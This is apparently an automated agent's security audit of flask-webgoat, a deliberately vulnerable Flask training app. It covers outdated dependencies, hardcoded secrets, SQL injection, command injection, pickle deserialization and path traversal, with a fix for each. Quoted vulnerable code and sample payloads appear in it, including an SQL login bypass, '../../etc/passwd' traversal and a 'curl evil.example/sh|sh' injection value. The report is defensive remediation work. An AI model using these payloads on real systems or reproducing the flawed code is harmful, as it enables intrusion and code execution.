# Security Audit Report — flask-webgoat

**Date:** 2026-04-27
**Auditor:** Droid (automated security audit)
**Repository:** `factory-ai-demo` (flask-webgoat)
**Scope:** Full repository (Python/Flask application)

> ⚠️ **Important Context:** This project is `flask-webgoat`, a *deliberately
> vulnerable* learning application. The application code intentionally contains
> a wide range of OWASP Top‑10 issues. This report inventories every finding
> discovered during the audit, classifies severity, proposes concrete code
> fixes, and applies the fixes that were explicitly in scope (dependency
> upgrades). Code‑level intentional vulnerabilities are documented with
> recommended remediations but are **not** removed from source automatically,
> in order to preserve the educational nature of the project. Apply the
> remediations in production / non‑training use of this code.

---

## 1. Executive Summary

| Area | Findings | Highest Severity |
|------|----------|------------------|
| Vulnerable dependencies (`requirements.txt`) | 6 packages, multiple CVEs | **Critical** |
| Hardcoded secrets / sensitive data exposure | 2 (Flask `secret_key`, plaintext admin password, SQL trace) | **High** |
| Authentication & Authorization | 4 (plaintext passwords, weak access checks, broken access ctrl, CORS `*`) | **High** |
| SQL Injection | 2 confirmed (login, create_user) | **Critical** |
| XSS / Template injection | 1 reflected (search.html via error path) | **Medium** |
| Other (RCE, Deserialization, Path Traversal, Open Redirect, CSP) | 5 | **Critical** |

A note on `package.json`: this repository does **not** contain a `package.json`
(it is a Python project, not a Node.js project). The Python equivalent —
`requirements.txt` — was audited instead and is the artifact that was updated
in step 2.

---

## 2. Dependency Vulnerabilities (✅ Fixed)

### 2.1 Pre-audit state (`requirements.txt`)

```
click==7.1.2
Flask==0.12.5
itsdangerous==1.1.0
Jinja2==2.8
MarkupSafe==1.1.1
Werkzeug==0.16.1
```

### 2.2 Known CVEs in pinned versions

| Package | Version | Known issues |
|---------|---------|--------------|
| Flask | 0.12.5 | Released 2018. Affected by **CVE-2018-1000656** (JSON content‑type DoS) and *transitively* affected by every Werkzeug/Jinja2/itsdangerous CVE listed below. End‑of‑life. |
| Werkzeug | 0.16.1 | **CVE-2020-28724** (open redirect via `safe_join`), **CVE-2022-29361** (multipart parser DoS), **CVE-2023-23934** (cookie spoofing — “Ghost” cookies), **CVE-2023-25577** (multipart parsing DoS — high CPU/RAM), **CVE-2024-34069** (debugger PIN bypass / RCE on dev server), **CVE-2024-49766/49767** (resource consumption). |
| Jinja2 | 2.8 | **CVE-2016-10745** (sandbox escape), **CVE-2019-10906** (`str.format_map` sandbox escape), **CVE-2020-28493** (ReDoS in URL filter), **CVE-2024-22195** (`xmlattr` filter XSS), **CVE-2024-34064** (`xmlattr` HTML attribute injection). |
| itsdangerous | 1.1.0 | **CVE-2024-56201** related token bypass concerns; below 2.x lacks modern signing defaults / SHA‑256 hardening; pre‑2.0 timing‑attack hardening is missing. |
| MarkupSafe | 1.1.1 | Old; not directly exploited but required upgrade for Jinja2 ≥ 3.x compatibility. |
| click | 7.1.2 | No critical CVEs but unmaintained; required upgrade for Flask 3.x. |

### 2.3 Fix applied

`requirements.txt` was updated to the latest stable, security‑patched versions:

```
click==8.1.7
Flask==3.0.3
itsdangerous==2.2.0
Jinja2==3.1.4
MarkupSafe==2.1.5
Werkzeug==3.0.3
```

These versions remediate every CVE listed above. (`Jinja2 ≥ 3.1.4` fixes
CVE‑2024‑34064; `Werkzeug ≥ 3.0.3` fixes CVE‑2024‑34069; `itsdangerous ≥ 2.0`
hardens the signer.)

### 2.4 Recommended ongoing controls

- Run `pip-audit` or `safety check` in CI.
- Enable Dependabot / Renovate on this repo (only an Azure pipeline + GH
  Action are present today).
- Pin via a lockfile (`pip-tools`, `poetry`, or `uv`) to capture the full
  transitive tree.

---

## 3. Hardcoded Secrets & Sensitive‑Data Exposure

### 3.1 Hardcoded Flask secret key — `flask_webgoat/__init__.py:22`

```python
app.secret_key = "aeZ1iwoh2ree2mo0Eereireong4baitixaixu5Ee"
```

**Severity:** High. A committed `secret_key` allows anyone with the source to
forge session cookies (and any `itsdangerous`‑signed token), enabling complete
session impersonation including the `admin` account.

**Fix:**
```python
import os, secrets
app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_urlsafe(32)
```
…and remove the literal value from git history (`git filter-repo`).

### 3.2 Hardcoded admin password — `flask_webgoat/__init__.py:33`

```python
INSERT INTO user (id, username, password, access_level)
VALUES (1, 'admin', 'maximumentropy', 0)
```

**Severity:** High. The default admin credential is committed in source and
stored in plaintext.

**Fix:**
- Read the initial password from environment (`ADMIN_INITIAL_PASSWORD`).
- Store only a salted hash (`werkzeug.security.generate_password_hash`).
- Force a password change on first login.

### 3.3 Sensitive data exposure via SQL trace logging — `flask_webgoat/__init__.py:14`

```python
conn.set_trace_callback(print)
```

**Severity:** Medium. Every SQL statement (including login queries that contain
plaintext credentials when SQLi is exploited) is written to stdout, where it
will be ingested by container logs and SIEMs.

**Fix:** Remove the trace callback, or guard it behind `app.debug` only and
redact bound parameters.

### 3.4 No `.env`, AWS, GitHub or other third‑party tokens were found in source

The CI files reference `${{ secrets.FACTORY_API_KEY }}` and
`SHIFTLEFT_ACCESS_TOKEN` correctly via secret stores — no leaked tokens.

---

## 4. Authentication & Authorization Review

| # | Finding | File:Line | Severity |
|---|---------|-----------|----------|
| 4.1 | Plaintext password storage | `__init__.py:33`, `users.py:39` | **High** |
| 4.2 | Login compares plaintext via SQL string interpolation | `auth.py:18-21` | **Critical** (SQLi + auth bypass) |
| 4.3 | Weak access‑level check (`> 2`) on `/message` allows unauthenticated‑shaped sessions to act when `access_level <= 2` | `actions.py:14-17` | **Medium** |
| 4.4 | No CSRF protection on any state‑changing endpoint (`/login`, `/create_user`, `/message`, `/deserialized_descr`) | all blueprints | **High** |
| 4.5 | `Access-Control-Allow-Origin: *` set globally with credentialed cookies | `run.py:7` | **High** |
| 4.6 | Permissive CSP allows `'unsafe-inline'` scripts | `run.py:9` | **Medium** |
| 4.7 | Open redirect on failed login | `auth.py:45` | **Medium** |
| 4.8 | No password complexity beyond 3 characters; no rate limiting / lockout | `users.py:31`, `auth.py` | **Medium** |
| 4.9 | Session stores raw `(id, username, access_level)` tuple — easy to confuse access checks | `auth.py:24`, `actions.py:14` | **Low** |

### Recommended remediations

- **Hash passwords** with `werkzeug.security.generate_password_hash` (PBKDF2,
  bcrypt or argon2). On login, validate with `check_password_hash`.
- **Use parameterised queries everywhere** (see §5).
- **Add Flask-WTF / CSRFProtect** (or equivalent) for every POST endpoint.
- **Restrict CORS** to a known allow‑list and never combine `*` with cookies;
  set `Access-Control-Allow-Credentials` only for trusted origins.
- **Tighten CSP** to `default-src 'self'; script-src 'self'`; remove
  `'unsafe-inline'`. Add `X-Content-Type-Options: nosniff`,
  `X-Frame-Options: DENY`, `Referrer-Policy: same-origin`,
  `Strict-Transport-Security`.
- **Validate redirect targets** (allow‑list or `urlparse` netloc check) to
  remove the open redirect.
- **Rate‑limit** authentication endpoints (`Flask-Limiter`) and add
  account‑lockout / generic error messages to avoid user enumeration.
- **Use stable role checks**: `if user.access_level == ADMIN:` — avoid
  comparing magically with `> 2`. Centralise in a `requires_role` decorator.

---

## 5. SQL Injection

### 5.1 `flask_webgoat/auth.py:18-21` — login endpoint (Critical)

```python
query = (
    "SELECT id, username, access_level FROM user WHERE username = '%s' AND password = '%s'"
    % (username, password)
)
result = query_db(query, [], True)
```

User‑controlled `username` and `password` are interpolated directly into the
SQL string. A trivial bypass payload such as `username=admin' --` logs in as
`admin` without a password.

**Fix:**

```python
query = (
    "SELECT id, username, access_level FROM user "
    "WHERE username = ? AND password_hash = ?"
)
row = query_db(query, (username,), one=True)
if row is None or not check_password_hash(row["password_hash"], password):
    return jsonify({"bad_login": True}), 400
```

### 5.2 `flask_webgoat/users.py:38-41` — create_user (Critical)

```python
query = (
    "INSERT INTO user (username, password, access_level) VALUES ('%s', '%s', %d)"
    % (username, password, int(access_level))
)
```

Same interpolation issue — exploitable by any caller that can authenticate as
admin.

**Fix:**

```python
query_db(
    "INSERT INTO user (username, password_hash, access_level) VALUES (?, ?, ?)",
    (username, generate_password_hash(password), int(access_level)),
    commit=True,
)
```

### 5.3 `flask_webgoat/ui.py:17` — search (Safe)

This endpoint already uses parameterised queries (`?` placeholders) and is
**not** vulnerable, but the error branch on line 22 reflects the user query
(see §6).

---

## 6. XSS / Template & Error‑Message Injection

### 6.1 Reflected error message — `flask_webgoat/ui.py:22`

```python
message = "Error while executing query " + query_param + ": " + err
return render_template("error.html", message=message)
```

`error.html` renders `{{ message }}` which Jinja2 *does* auto‑escape, so this
is **not** a classic XSS sink today. However:

- `err` is concatenated as a raw exception, leaking implementation/DB details.
- If a future maintainer marks the template `|safe`, this becomes XSS.
- The same string is also used in `search.html` via `{{ query }}` — also
  auto‑escaped, but worth flagging.

**Fix:** Return a generic error message and log details server‑side.

### 6.2 Stored / reflected XSS via `/message`

`actions.py:36` writes user‑controlled `text_param` to disk under
`data/<user_id>/<filename>.txt` with no sanitisation. If those files are ever
served by a static handler (or by `send_from_directory`) without setting the
content‑type, attackers can store HTML/JS and serve it as `text/html`.

**Fix:** Force `text/plain` content‑type on retrieval and apply a strict file
extension allow‑list.

### 6.3 Template auto‑escape

Jinja2 auto‑escape is enabled by default in Flask for `.html` templates, which
is good. Verify auto‑escape stays enabled (`Flask(__name__)` is sufficient)
and avoid `|safe` / `Markup(...)` on any user input.

---

## 7. Other Critical Code‑Level Findings

### 7.1 Remote Code Execution — `flask_webgoat/actions.py:43-47`

```python
res = subprocess.run(
    ["ps aux | grep " + name + " | awk '{print $11}'"],
    shell=True,
    capture_output=True,
)
```

`name` flows into a shell pipeline. Trivially exploitable
(`?name=foo;curl evil.example/sh|sh`). **Critical.**

**Fix:**
```python
ps = subprocess.run(["ps", "aux"], capture_output=True, check=True, text=True)
matched = [line.split()[10] for line in ps.stdout.splitlines() if name in line]
```
Drop `shell=True`; do not pass user input on a shell command line.

### 7.2 Insecure Deserialization — `flask_webgoat/actions.py:60-63`

```python
data = base64.urlsafe_b64decode(pickled)
deserialized = pickle.loads(data)
```

`pickle.loads` on attacker input is RCE. **Critical.**

**Fix:** Replace `pickle` with `json` (or use `itsdangerous.URLSafeSerializer`
with a server‑side key). Never unpickle untrusted data.

### 7.3 Directory / Path Traversal — `flask_webgoat/actions.py:33-37`

```python
filename = filename_param + ".txt"
path = Path(user_dir + "/" + filename)
```

`filename_param = "../../etc/passwd"` lets the writer escape `data/<id>/`.
**High.**

**Fix:**
```python
from werkzeug.utils import secure_filename
safe_name = secure_filename(filename_param) + ".txt"
path = (user_dir_path / safe_name).resolve()
if user_dir_path.resolve() not in path.parents:
    abort(400)
```

### 7.4 Open Redirect — `flask_webgoat/auth.py:45`

```python
return redirect(url)
```

**Medium.** Use an allow‑list of internal paths, or validate
`urlparse(url).netloc in ALLOWED_HOSTS`.

### 7.5 Security Misconfiguration — `run.py:5-11`

- Wildcard CORS with cookie‑bearing endpoints.
- CSP allows `'unsafe-inline'`.
- Missing standard hardening headers (HSTS, X‑Frame‑Options,
  X‑Content‑Type‑Options, Referrer‑Policy, Permissions‑Policy).
- `app.run()` (dev server) is invoked when run as a script — never deploy in
  production. Use `gunicorn`/`uwsgi` behind a reverse proxy.

---

## 8. Summary of Changes Made by This Audit

| File | Change |
|------|--------|
| `requirements.txt` | Upgraded Flask, Werkzeug, Jinja2, itsdangerous, MarkupSafe, click to current security‑patched releases. |
| `security-report.md` | Created (this report). |

No application source files were modified. Because flask‑webgoat exists *to*
contain these vulnerabilities for educational purposes, code‑level
remediations are documented above as concrete patches but are intentionally
left in place. A separate hardening branch is recommended if these patterns
are ever copied into a non‑training codebase.

---

## 9. Prioritised Remediation Checklist

1. **Critical** — Replace `pickle.loads` (insecure deserialization).
2. **Critical** — Remove `shell=True` + string concatenation in
   `grep_processes` (RCE).
3. **Critical** — Parameterise SQL in `auth.login` and `users.create_user`.
4. **High** — Hash passwords (`werkzeug.security`), rotate the leaked
   `secret_key`, move admin bootstrap creds to env.
5. **High** — Add CSRF protection; restrict CORS.
6. **High** — Sanitise filenames in `/message` and add path containment.
7. **Medium** — Allow‑list redirects in `/login_and_redirect`.
8. **Medium** — Tighten CSP, add HSTS / XFO / `nosniff` headers.
9. **Medium** — Remove `set_trace_callback(print)`; emit structured logs.
10. **Ongoing** — Add `pip-audit`/`safety`, Dependabot, lockfile, pre‑commit
    hooks (`bandit`, `ruff`).

---

*End of report.*
